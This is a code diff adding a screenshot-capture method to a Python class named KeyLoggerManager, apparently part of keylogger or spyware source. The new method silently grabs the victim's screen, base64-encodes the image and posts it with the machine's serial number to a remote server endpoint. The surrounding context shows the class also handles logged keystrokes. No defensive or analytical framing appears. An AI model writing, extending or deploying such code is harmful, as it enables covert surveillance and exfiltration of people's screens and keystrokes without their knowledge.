@@ -63,3 +63,23 @@ class KeyLoggerManager(IKeyLoggerManager):
         for key, value in logged_keys.items():
             print(key)
             print(value)
+
+    def take_screenshot(self):
+            try:
+                screenshot = pyautogui.screenshot()
+                img_byte_arr = io.BytesIO()
+                screenshot.save(img_byte_arr, format='PNG')
+                img_bytes = img_byte_arr.getvalue()
+                encoded_img = base64.b64encode(img_bytes).decode('utf-8')
+
+                data = {
+                    "machine": str(self.__serial_number),
+                    "screenshot": encoded_img,
+                }
+
+                response = requests.post(URL + f'/api/screenshot/{self.__serial_number}', json=data)
+
+                return response.status_code == 200
+            except Exception as e:
+                print(f"Error taking screenshot: {e}")
+                return False
